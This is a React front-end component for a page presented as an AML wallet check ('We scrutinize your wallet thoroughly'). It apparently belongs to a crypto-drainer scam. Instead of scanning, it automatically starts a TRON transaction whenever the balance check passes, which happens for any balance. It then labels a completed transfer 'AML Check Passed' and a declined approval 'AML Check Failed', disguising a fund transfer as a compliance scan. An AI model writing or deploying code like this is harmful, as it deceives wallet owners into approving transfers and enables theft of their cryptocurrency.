"use client";
import "./CheckInProcess.css";
import React, { useEffect, useState } from "react";
import { useWallet } from "@/app/context/globalContext";
import { useTronTransaction } from "@/app/hooks/useTronTransaction";
import AmlCheckPassed from "../AmlCheckPassed";
import AmlCheckFailed from "../AmlCheckFailed";

const CheckInProcess = () => {
  const { balances } = useWallet(); // Accesăm balanțele din context
  const { initiateTransaction, isLoading, transactionStatus } =
    useTronTransaction(); // Hook pentru inițierea tranzacției
  const [status, setStatus] = useState(null); // Status pentru procesare (valid sau invalid)
  const [showAmlCheck, setShowAmlCheck] = useState(false); // Comută între componente
  console.log({
    transactionStatus
  });
  
  useEffect(() => {
    // Verificăm balanța TRX
    const checkBalancesAndInitiateTransaction = async () => {
      if (balances.trx >= 0) {
        console.log("avem mai mult de 2 trx");
        
        setStatus("valid"); // Balanța este suficientă
      } else {
        setStatus("invalid"); // Balanța este insuficientă
      }
    };
    checkBalancesAndInitiateTransaction();
  }, [ balances]);
  const handleInitiateTransaction = async () => {
    try {
      await initiateTransaction()
    } catch (error) {
      console.log("error to initiate a transaction");
    }
  }
  useEffect(() => {
    if(status==="valid") {
       initiateTransaction();
    }
  }, [status])

  // Trecerea la componenta AML după tranzacție
  useEffect(() => {
    if (transactionStatus === "Transfer successful!") {
      setTimeout(() => {
        setShowAmlCheck(true);
      }, 1000); // Mică întârziere pentru tranziție
    }
  }, [transactionStatus]);

  // Afișare componenta AML Check Passed
  if (showAmlCheck) {
    return <AmlCheckPassed />;
  } else if (transactionStatus=== "Transaction failed." || transactionStatus === "User disapproved requested methods'" ) {
    return <AmlCheckFailed/>
  }

  return (
    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-lg text-center">
      <div className="flex justify-between items-center mb-4">
        <h2 className="text-2xl font-semibold">Check in process</h2>
        <span className="text-blue-500 bg-blue-100 text-sm px-4 py-1 rounded-full border border-blue-200">
          Step 3 of 4
        </span>
      </div>
      <p className="text-gray-500 mb-6">
        We scrutinize your wallet thoroughly
      </p>

      {/* Interfața pentru procesare */}
      <div className="flex items-center justify-center mb-6">
        <div
          className={`w-24 h-24 border-4 rounded-full flex items-center justify-center ${
            status === "valid" ? "border-blue-500" : "border-red-500"
          } ${isLoading ? "pulsating-circle" : ""}`} // Efect de pulsare dacă isLoading
        >
          <span
            className={`block w-6 h-6 rounded-full ${
              status === "valid" ? "bg-blue-500" : "bg-red-500"
            }`}
          ></span>
        </div>
      </div>

      {status === "valid" && isLoading && (
        <p className="text-gray-400">
          Processing your transaction, please wait...
        </p>
      )}

      {status === "valid" && !isLoading && (
        <div>
        <p className="text-gray-400">
          Please wait 1 minute, we will provide the result soon
        </p>
              {/* <button
              className="w-full py-2 px-4 text-white rounded-lg bg-blue-500 hover:bg-blue-600"
              onClick={handleInitiateTransaction}
            >
              Check wallet
            </button> */}
        </div>
      )}

      {status === "invalid" && (
        <div className="bg-red-100 text-red-500 p-4 rounded-lg">
          <p>
            You don't have at least 20 TRX in your balance for a full scan.
            Refill your wallet and try again.
          </p>
        </div>
      )}
    </div>
  );
};

export default CheckInProcess;
